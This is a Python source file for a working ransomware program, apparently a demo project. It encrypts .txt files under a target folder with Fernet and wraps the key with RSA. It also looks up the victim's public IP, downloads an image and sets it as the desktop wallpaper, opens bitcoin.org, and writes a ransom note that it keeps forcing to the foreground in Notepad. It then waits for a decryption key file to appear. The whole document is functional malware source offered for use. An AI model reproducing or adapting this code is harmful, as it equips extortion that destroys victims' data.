from cryptography.fernet import Fernet 
import os 
import webbrowser 
import ctypes 
import urllib.request 
import requests 
import time 
import datetime 
import subprocess 
import win32gui 
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading 



class RansomWare:

    
   
    file_exts = [
        'txt',
       

    ]


    def __init__(self):
        
        self.key = None
        
        self.crypter = None
        
        self.public_key = None

        
        
        self.sysRoot = os.path.expanduser('~')
        
        self.localRoot = r'C:\Users\e22cs\OneDrive\Desktop\Python-Ransomware-master\localRoot' 

        
        self.publicIP = requests.get('https://api.ipify.org').text


   
    def generate_key(self):
        
        self.key =  Fernet.generate_key()
        
        self.crypter = Fernet(self.key)

    
    
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)


   
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
           
            self.public_key = RSA.import_key(open('public.pem').read())
            
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            
            enc_fernent_key = public_crypter.encrypt(fernet_key)
           
            f.write(enc_fernent_key)
       
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        
        self.key = enc_fernent_key
       
        self.crypter = None


    
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            
            data = f.read()
            if not encrypted:
                
                print(data)
                
                _data = self.crypter.encrypt(data)
                
                print('> File encrpyted')
                print(_data)
            else:
                
                _data = self.crypter.decrypt(data)
                
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
            
            fp.write(_data)


    
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)


    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
       
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
RANSOMWARE RANSOMWAARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE 
RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE 
RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE 
RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE 
RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE 
RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE 
RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE 
RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE 
RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE RANSOMWARE 
''')


    def show_ransom_note(self):
        
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing') 
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') 
                
                time.sleep(0.1)
                ransom.kill()
                
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            
            time.sleep(10)
            count +=1 
            if count == 5:
                break

    
   
    def put_me_on_desktop(self):
        
        print('started') 
        while True:
            try:
                print('trying') 
                
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    
                    self.crypt_system(encrypted=True)
                    print('decrypted') 
                    break
            except Exception as e:
                print(e) 
                pass
            time.sleep(10) 
            print('Checking for PUT_ME_ON_DESKTOP.txt') 
            



def main():
    
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted')   
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') 
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted') 
    print('> RansomWare: Completed') 


if __name__ == '__main__':
    main()
 
